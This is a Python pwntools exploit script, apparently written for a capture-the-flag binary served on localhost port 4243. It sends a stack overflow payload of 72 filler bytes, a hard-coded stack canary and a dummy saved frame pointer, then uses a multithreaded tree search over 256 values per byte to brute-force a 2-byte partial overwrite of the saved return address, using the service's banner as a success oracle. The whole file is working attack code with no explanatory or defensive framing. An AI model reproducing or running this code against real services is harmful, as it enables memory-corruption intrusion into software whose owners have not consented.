from pwn import *
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

context.log_level = 'critical'
target = 'localhost'
port = 4243

# ==========================================
# 1. Single-Probe Verification
# ==========================================
def test_candidate(prefix_payload, candidate_byte, validation_marker):
    """
    Sends the prefix + candidate_byte and checks if the response
    satisfies the validation oracle (e.g., loop prompt or surviving output).
    """
    p = None
    try:
        p = remote(target, port, level='critical')
        p.recvuntil(b"[BOBBY] You don't know what you've gotten into: ", timeout=0.2)
        
        # Send payload + single trial byte
        p.send(prefix_payload + bytes([candidate_byte]))
        response = p.recvrepeat(timeout=0.25)
        p.close()

        if validation_marker in response:
            return candidate_byte, response
        return None
    except (EOFError, PwnlibException):
        if p is not None:
            p.close()
        return None

# ==========================================
# 2. Branch Exploration (One Level of Tree)
# ==========================================
def scan_all_surviving_bytes(current_prefix, validation_marker, max_workers=16):
    """
    Tests all 256 possibilities for the next byte position.
    Returns a list of all bytes that survived/matched the oracle.
    """
    survivors = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(test_candidate, current_prefix, b, validation_marker): b 
            for b in range(256)
        }
        for future in as_completed(futures):
            res = future.result()
            if res is not None:
                byte_val, resp_snippet = res
                survivors.append((byte_val, resp_snippet))
    return survivors

# ==========================================
# 3. Tree Search Controller (Depth = N bytes)
# ==========================================
def explore_byte_tree(base_payload, depth=2, validation_marker=b"You don't know what you've gotten into"):
    """
    Explores all valid pathways up to `depth` bytes, returning a tree
    of successful paths and their terminal behaviors.
    """
    # Queue stores tuples: (current_path_bytes, list_of_responses)
    frontier = [(b'', [])]

    for level in range(depth):
        print(f"\n[*] --- Exploring Tree Level {level + 1}/{depth} (Active branches: {len(frontier)}) ---")
        next_frontier = []

        for current_path, history in frontier:
            full_prefix = base_payload + current_path
            path_hex = current_path.hex() if current_path else "ROOT"
            print(f"[*] Scanning branches from node: [{path_hex}]")

            valid_branches = scan_all_surviving_bytes(full_prefix, validation_marker, max_workers=16)

            for byte_val, resp in valid_branches:
                new_path = current_path + bytes([byte_val])
                next_frontier.append((new_path, history + [resp]))
                print(f"  └─> Branch Found: +{hex(byte_val)} | Full Path: {new_path.hex()}")

        frontier = next_frontier
        if not frontier:
            print("[-] All branches dead-ended.")
            break

    return frontier

# ==========================================
# Execution Entry Point
# ==========================================
if __name__ == '__main__':
    canary = b'\x00\x2f\x2e\xe4\x9f\xb3\xac\xdb'
    saved_rbp = p64(0x0)  # Dummy RBP padding
    
    # Base layout up to the Saved RIP
    base_payload = b'A' * 72 + canary + saved_rbp

    # Search for all 2-byte partial overwrite paths
    oracle_marker = b"You don't know what you've gotten into"
    print(f"[+] Starting 2-byte tree exploration targeting oracle: {oracle_marker}...")

    tree_results = explore_byte_tree(base_payload, depth=2, validation_marker=oracle_marker)

    print(f"\n[+] Exploration Complete! Found {len(tree_results)} surviving 2-byte path(s):")
    for path, history in tree_results:
        print(f"  • Path: 0x{path.hex()} ({path})")
        # history contains the response from each level of the tree
        for level_idx, resp in enumerate(history):
            print(f"  [Level {level_idx + 1} Output]:")
            # Print raw escaped bytes or decoded text safely
            try:
                decoded = resp.decode('utf-8', errors='replace')
                print(f"    {decoded.strip()}")
            except Exception:
                print(f"    {repr(resp)}")
        print()